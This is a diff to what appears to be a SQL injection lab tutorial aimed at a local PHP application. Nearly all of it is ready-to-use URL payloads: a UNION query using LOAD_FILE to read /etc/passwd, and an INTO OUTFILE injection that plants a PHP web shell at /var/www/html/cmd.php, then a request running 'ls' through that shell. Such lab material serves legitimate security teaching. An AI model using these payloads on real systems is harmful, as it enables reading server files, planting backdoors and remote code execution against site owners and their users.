@@ -56,4 +56,19 @@ http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SE
 
 If file permissions are set to db user (e.g. logged in as root or `GRANT FILE ON *.* TO 'user'@'%';` is set):
 
+Use `LOAD_FILE`:
+
 http://127.0.0.1:8781/list_user/user_information.php?UserID=1%20UNION%20ALL%20SELECT%20LOAD_FILE(%27/etc/passwd%27),2,3
+
+## Write Code to Server
+
+Use `INTO OUTFILE`: 
+
+http://127.0.0.1:8781/user_information.php?UserID=1%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27
+
+`/var/www/html/cmd.php` should not exist before.
+
+After that you can check remote code execution with:
+
+http://127.0.0.1:8781/cmd.php?cmd=ls
+
